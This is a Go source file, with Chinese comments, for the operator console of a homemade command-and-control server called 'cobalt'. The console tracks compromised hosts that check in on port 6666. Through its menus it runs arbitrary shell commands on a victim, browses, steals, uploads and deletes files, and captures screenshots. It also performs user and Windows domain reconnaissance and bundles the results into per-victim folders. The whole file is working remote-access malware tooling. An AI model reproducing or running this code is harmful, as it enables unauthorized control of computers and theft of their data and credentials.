package main

import (
	cobalt_file "My-Comment/cobalt.file"
	"My-Comment/cobalt.tcp"
	"fmt"
	"log"
	"os"
	"os/exec"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var Computer = runtime.GOOS
var DEBUG = cobalt_tcp.DEBUG

/*
当前任务列表
 搜集信息的时候可以选择全部都要，然后保存到文件中
1. 客户机设置
2. debug模式
bug : 	连接无法重新建立，一旦断开，就无法重新连接
		有些命令返回无法正常运行，会让客户端直接挂掉
		统一编码方式
*/
//var ipChanMap = make(map[int]cobalt_tcp.HOSTS, cobalt_tcp.MaxConnect)

//var ipChanMap map[int]*cobalt_tcp.HOSTS
func main() {
	//for i := 0; i < cobalt_tcp.MaxConnect; i++ {
	//	ipChanMap[i] = new(cobalt_tcp.HOSTS)
	//}
	fmt.Println("正在启动\n")
	listener, err := cobalt_tcp.MyListen()
	if err != nil {
		fmt.Println("监听失败\n")
		fmt.Println(err)
	} else {
		go cobalt_tcp.IpChanMap[0].Listener(listener)
		fmt.Printf("开始监听端口6666\n")
	}
	for {
		menu()
	}

}

// 菜单函数
func menu() {
	var num int
	exec.Command("clear") // 清除屏幕
	fmt.Printf("当前上线主机: %d\n", len(cobalt_tcp.IpChanMap))
	fmt.Printf("主机编号   主机ip\t主机最后一次心跳时间\t当前时间\t心跳频率\n")
	//for id, host := range ipChanMap {
	//	host.PrintHost(id)
	//}
	for i := 1; i <= len(cobalt_tcp.IpChanMap); i++ {
		//ipChanMap[i].PrintHost(i - 1)
		hosts := cobalt_tcp.IpChanMap[i]
		fmt.Printf("%d\t%s\t%s\t\t%s\t %s\n", i, hosts.Ip, hosts.Time,
			time.Now().Format("01-02 15:04:05"), hosts.Living)
	}
	if len(cobalt_tcp.IpChanMap) == 0 {
		fmt.Printf("按任意键刷新\n")
		fmt.Scanf("%d")
		return
	}

	if cobalt_tcp.Computer == "Windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		n, err := fmt.Scanf("%d", &num)
		if n != 1 || err != nil {
			fmt.Printf("选择功能\n")
			fmt.Printf("1. 开始选择主机\n")
			fmt.Printf("0. 刷新\n")
			continue
		}
		break
	}

	switch num {
	case 1:
		SelectHost()
	default:
		return
	}

}

func SelectHost() {
	var contralId int
	exec.Command("clear") // 清除屏幕
	fmt.Printf("1.选择要查看的主机编号\n按0返回上一级\n")
	//for id, host := range ipChanMap {
	//	fmt.Printf("%d\t%s\n", id+1, host.Ip)
	//}
	for i := 1; i <= len(cobalt_tcp.IpChanMap); i++ {
		fmt.Printf("%d\t%s\n", i, cobalt_tcp.IpChanMap[i].Ip)
	}
	if cobalt_tcp.Computer == "Windows" {
		fmt.Scanf("%s", &contralId)
	}
	for {
		okNum, _ := fmt.Scanf("%d", &contralId)
		if okNum != 1 || contralId < 0 || contralId > len(cobalt_tcp.IpChanMap) { //第一次输入错误检测
			fmt.Printf("按0返回上一级\n1.选择要查看的主机编号:\n")
			continue
		} else if contralId == 0 {
			return
		}
		break
	}
	//exec.Command("clear")            // 清除屏幕
	//ipChanMap[contralId-1].SetHost() // 设置这个客户机

	SetHost(cobalt_tcp.IpChanMap[contralId], contralId)
	//fmt.Printf("完成一次赋值")
	//ipChanMap[contralId-1] = hostss

}

func SetHost(hosts cobalt_tcp.HOSTS, id int) {
	//defer menu() //最后的时候仍然调用menu函数

	var num int
	fmt.Printf("主机名\t主机ip\t主机最后一次心跳时间\t当前时间\t心跳时间\t\n")
	fmt.Printf("%s\t%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1. 刷新\n")
	fmt.Printf("2. 主机信息搜集\n")
	fmt.Printf("3. 域信息搜集\n")
	fmt.Printf("4. 执行cmd指令\n")
	fmt.Printf("5. 文件浏览及上传下载\n")
	fmt.Printf("6. 一键打包信息搜集\n")
	fmt.Printf("7. 截取屏幕\n")
	//fmt.Printf("7. 刷新\n")
	fmt.Printf("按0返回主界面\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err != nil || okNum != 1 || num < 0 || num > 7 {
			//错误检测
			fmt.Printf("1. 刷新\n")
			fmt.Printf("2. 主机信息搜集\n")
			fmt.Printf("3. 域信息搜集\n")
			fmt.Printf("4. 执行cmd指令\n")
			fmt.Printf("5. 文件浏览及上传下载\n")
			fmt.Printf("6. 一键打包信息搜集\n")
			fmt.Printf("7. 截取屏幕\n")
			//fmt.Printf("7. 刷新\n")
			fmt.Printf("按0返回主界面\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}

	switch num {

	case 1:
		exec.Command("clear") // 清除屏幕
		SetHost(hosts, id)
	case 2:
		ViewHost(hosts, id)
		//defer SetHost(hosts, id)
	case 3:
		ViewDemain(hosts, id)
		//defer SetHost(hosts, id)
	case 4:
		hosts.UseCmd(id)
		defer SetHost(hosts, id)
	case 5:
		FileDeal(id)
		defer SetHost(hosts, id)
	case 6:
		AllInfo(id)
		defer SetHost(hosts, id)
	case 7:
		Watch(id)
		defer SetHost(hosts, id)
	case 0:
		return

	}

}
func ViewHost(hosts cobalt_tcp.HOSTS, id int) {
	//exec.Command("clear") // 清除屏幕
	var num int
	fmt.Printf("主机名\t主机ip\t主机最后一次心跳时间\t当前时间\t心跳时间\t\n")
	fmt.Printf("%s\t%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1.刷新\n")
	fmt.Printf("2. 进程查看\n")     //wmic process list brief
	fmt.Printf("3. 查看所有用户\n")   //net user
	fmt.Printf("4. 查看本地管理员\n")  // net localgroup administrators
	fmt.Printf("5. 查看主机ip信息\n") //ipconfig /all
	fmt.Printf("6. 查看路由表\n")    //route print
	fmt.Printf("7. 查看本机服务\n")   //wmic service list brief
	fmt.Printf("0. 返回上一层\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err != nil || okNum != 1 || num < 0 || num > 6 {
			//错误检测
			fmt.Printf("1.刷新\n")
			fmt.Printf("2. 进程查看\n")     //wmic process list brief
			fmt.Printf("3. 查看所有用户\n")   //net user
			fmt.Printf("4. 查看本地管理员\n")  // net localgroup administrators
			fmt.Printf("5. 查看主机ip信息\n") //ipconfig /all
			fmt.Printf("6. 查看路由表\n")    //route print
			fmt.Printf("7. 查看本机服务\n")   //wmic service list brief
			fmt.Printf("0. 返回上一层\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}
	switch num {
	case 1:
		defer ViewHost(hosts, id)
		return
	case 2:
		hosts.SetCmd("wmic process list brief")
		defer ViewHost(hosts, id)
	case 3:
		hosts.SetCmd("net user")
		defer ViewHost(hosts, id)
	case 4:
		hosts.SetCmd("net localgroup administrators")
		defer ViewHost(hosts, id)
	case 5:
		hosts.SetCmd("ipconfig /all")
		defer ViewHost(hosts, id)
	case 6:
		hosts.SetCmd("route print")
		defer ViewHost(hosts, id)
	case 7:
		hosts.SetCmd("wmic service list brief")
		defer ViewHost(hosts, id)
	case 0:
		defer ViewHost(hosts, id)
	}
}
func ViewDemain(hosts cobalt_tcp.HOSTS, id int) {
	var num int
	fmt.Printf("主机名\t主机ip\t主机最后一次心跳时间\t当前时间\t心跳时间\t\n")
	fmt.Printf("%s\t%s\t\t%s\t%s\t%s\n", hosts.Whoami, hosts.Ip, hosts.Time,
		time.Now().Format("01-02 15:04:05"), hosts.Living)
	fmt.Printf("1.刷新\n")
	fmt.Printf("1. 查看域的名字\n")     //net config workstation
	fmt.Printf("2. 查询域列表\n")      //net view /domain
	fmt.Printf("3. 查看所有域用户组列表\n") //net group /domain
	fmt.Printf("4. 探测存活主机\n")     //arp -a
	fmt.Printf("5. 查看机器所属那个域\n")  //net config Workstation
	fmt.Printf("0. 返回上一层\n")
	fmt.Printf("\n请输入选项:  ")
	if Computer == "windows" {
		fmt.Scanf("%s", &num)
	}
	for {
		okNum, err := fmt.Scanf("%d", &num)
		if err == nil || okNum != 1 || num < 0 || num > 6 {
			//错误检测
			fmt.Printf("1.刷新\n")
			fmt.Printf("1. 查看域的名字\n")     //net config workstation
			fmt.Printf("2. 查询域列表\n")      //net view /domain
			fmt.Printf("3. 查看所有域用户组列表\n") //net group /domain
			fmt.Printf("4. 探测存活主机\n")     //arp -a
			fmt.Printf("5. 查看机器所属那个域\n")  //net config Workstation
			fmt.Printf("0. 返回上一层\n")
			fmt.Printf("\n请输入选项:  ")
			continue
		}
		break
	}
	switch num {
	case 1:
		defer ViewHost(hosts, id)
		return
	case 2:
		hosts.SetCmd("net config workstation")
		defer ViewDemain(hosts, id)
	case 3:
		hosts.SetCmd("net view /domain")
		defer ViewDemain(hosts, id)
	case 4:
		hosts.SetCmd("net group /domain")
		defer ViewDemain(hosts, id)
	case 5:
		hosts.SetCmd("arp -a")
		defer ViewDemain(hosts, id)
	case 6:
		hosts.SetCmd("net config Workstation")
		defer ViewDemain(hosts, id)
	case 0:
		defer SetHost(hosts, id)
	}
}

func FileDeal(id int) {
	hosts := cobalt_tcp.IpChanMap[id]
	var (
		relativePath string
		abslsentPath = ""
		Type         = ""
		temp         = ""
	)

	reg := regexp.MustCompile("(.*/)")
	hosts.Chans <- "DocumentDocument\r\n"
	if DEBUG {
		fmt.Printf("DocumentDocument\r\n")
	}
	for _, j := range hosts.Disk[1:] {
		fmt.Printf("存在盘符%s\n", j)
	}
	//fmt.Printf("%s", <-hosts.chansBack)
	if Computer == "windows" {
		fmt.Scanf("%s", temp)
	}
	for {

		fmt.Printf("%s>", abslsentPath)
		_, err := fmt.Scanf("%s %s\n", &Type, &relativePath)
		if err != nil && err.Error() != "unexpected newline" {
			fmt.Printf("输入错误6\n")
			log.Println(err)
		}
		if DEBUG {
			fmt.Printf("Type : %s\nPath: %s\n"+
				"", Type, relativePath)
		}

		switch Type {
		case "dir":
			if abslsentPath != "" {
				hosts.Chans <- "Documentdir " + abslsentPath
			} else {
				fmt.Println("当前路径为空")
			}
		case "cd":
			if relativePath == ".." {
				if strings.Index(abslsentPath, "\\") == -1 {
					if DEBUG {
						fmt.Printf("未找到/\n")
					}
					if DEBUG {
						fmt.Printf("当前盘符容量：%d盘符len：%d\n", cap(hosts.Disk), len(hosts.Disk))
					}
					for _, j := range hosts.Disk[1:] {
						fmt.Printf("存在盘符%s\n", j)
					}
					abslsentPath = "" //默认没有/的时候就清空
					continue
				}
				abslsentPath = reg.FindString(abslsentPath) //如果最后一个是“/”就需要去掉
				if abslsentPath[len(abslsentPath)-1:] == "/" {
					abslsentPath = abslsentPath[:len(abslsentPath)-1]
				}

			} else if abslsentPath == "" {
				abslsentPath = relativePath
			} else if relativePath == "" {
				hosts.Chans <- "DocumentDocument\r\n"
				abslsentPath = ""
				relativePath = ""
				continue
			} else {
				abslsentPath = abslsentPath + "/" + relativePath
			}
			path := "Documentdir " + abslsentPath
			if DEBUG {
				fmt.Printf("path:%s\n", path)
			}
			hosts.Chans <- path
			go cobalt_tcp.Times(800, id)
			<-cobalt_tcp.IpChanMap[id].ChansTime
		case "get":
			hosts.Chans <- "Documentget " + abslsentPath + "/" + relativePath
			hosts.ChansFileName <- relativePath
			go cobalt_tcp.Times(800, id)
			<-cobalt_tcp.IpChanMap[id].ChansTime
		case "del":
			hosts.Chans <- "Documentdel " + abslsentPath + "/" + relativePath
			go cobalt_tcp.Times(800, id)
			<-cobalt_tcp.IpChanMap[id].ChansTime
		case "put":
			//hosts.Chans <- "Documentput " + abslsentPath
			Fileput(abslsentPath, id)
			go cobalt_tcp.Times(800, id)
			<-cobalt_tcp.IpChanMap[id].ChansTime
		case "quit":
			hosts.Chans <- "Documentquit"
			return
		default:
			DocumentHelp()
			//help
		}
		//time.Sleep(1000)
	}

}
func DocumentHelp() {
	fmt.Println("1.进入目录：cd ”目录“ or “..”")
	fmt.Println("2.查看当前目录：dir")
	fmt.Println("3.在当前文件夹下获得文件：get “文件名称”")
	fmt.Println("4.在当前文件夹下发送文件：先”put“  然后输入本地要发送文件位置")
	fmt.Println("5.删除当前文件夹下文件：del “文件名称”")
}
func Fileput(AimPath string, id int) {

	var lens int64
	var err1 error
	var file []byte
BEGIN:
	fmt.Println("输入要传输的本地文件：")
	fmt.Println(" 按quit退出")
	localPath := ""
	if Computer == "windows" {
		fmt.Scanf("%s", &localPath)
	}
	fmt.Scanf("%s", &localPath)
	if DEBUG {
		fmt.Printf("输入的路径：%s\n", localPath)
	}
	if strings.Index(localPath, "quit") == 0 {
		return
	}

	file, lens, err1 = cobalt_file.OpenFIle(localPath)
	if err1 != nil {
		fmt.Printf("输入错误，")
		goto BEGIN
	}
	//需要正则匹配一下
	regstring := "(.*/)"
	reg := regexp.MustCompile(regstring)
	AimName := reg.ReplaceAllString(localPath, ``)
	cobalt_tcp.IpChanMap[id].Chans <- "Documentput " + AimPath + "/" + AimName
	cobalt_tcp.IpChanMap[id].Chans <- "Document" + strconv.FormatInt(lens, 10)
	go cobalt_tcp.Times(100, id)
	<-cobalt_tcp.IpChanMap[id].ChansTime
	cobalt_tcp.IpChanMap[id].Chans <- "Document" + string(file)

	if DEBUG {
		fmt.Printf("文件内容：\n")
		fmt.Println(file)
	}
	fmt.Printf("文件发送完成\n")

	//fmt.Printf("fileput")
}
func AllInfo(id int) {
	dirname := cobalt_tcp.IpChanMap[id].Ip
	err := os.Mkdir(dirname, 0755)
	if err != nil {
		fmt.Println("创建父文件夹失败")
		log.Println(err)
		return
	}
	err1 := os.Mkdir(dirname+"/"+"用户信息", 0755)
	if err1 != nil {
		fmt.Println("创建子文件夹1失败")
		log.Println(err1)
		return
	}
	err2 := os.Mkdir(dirname+"/"+"域信息", 0755)
	if err2 != nil {
		fmt.Println("创建子文件夹2失败")
		log.Println(err2)
		return
	}
	allUserCmd := map[string]string{
		//"当前进程":"wmic process list brief",
		"所有用户":  "net user",
		"本地管理员": "net localgroup administrators",
		//"主机ip信息": "ipconfig /all",
		"路由表": "route print",
		//"本机服务": "wmic service list brief",
	}

	allDomainCmd := map[string]string{

		"域的名字": "net config workstation",
		//"域列表":    "net view /domain",
		"域用户组列表": "net group /domain",
		"存活主机":   "arp -a",
		"所属域":    "net config Workstation",
	}
	langCmd := "Cmd\r\n"

	for name, cmd := range allUserCmd { //用来写入用户信息
		filename := dirname + "/用户信息/" + name
		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
		langCmd = langCmd + cmd + "#"

	}
	for name, cmd := range allDomainCmd {
		filename := dirname + "/域信息/" + name
		cobalt_tcp.IpChanMap[id].ChansFileName <- filename
		langCmd = langCmd + cmd + "#"

	}
	cobalt_tcp.IpChanMap[id].Chans <- langCmd[:len(langCmd)-1]
	//cobalt_tcp.IpChanMap[id].ChansFileName <- "###"
	//<-cobalt_tcp.IpChanMap[id].ChansTime
	//if DEBUG {
	//	fmt.Printf("结束一键执行\n")
	//}

}
func Watch(id int) {

	cmd := "Watch\r\n"
	name := cobalt_tcp.IpChanMap[id].Ip + "_" + time.Now().Format("01_02_15_04_05") + ".jpg"
	cobalt_tcp.IpChanMap[id].ChansFileName <- name
	cobalt_tcp.IpChanMap[id].Chans <- cmd
	fmt.Printf("等待接受图片\n")
}
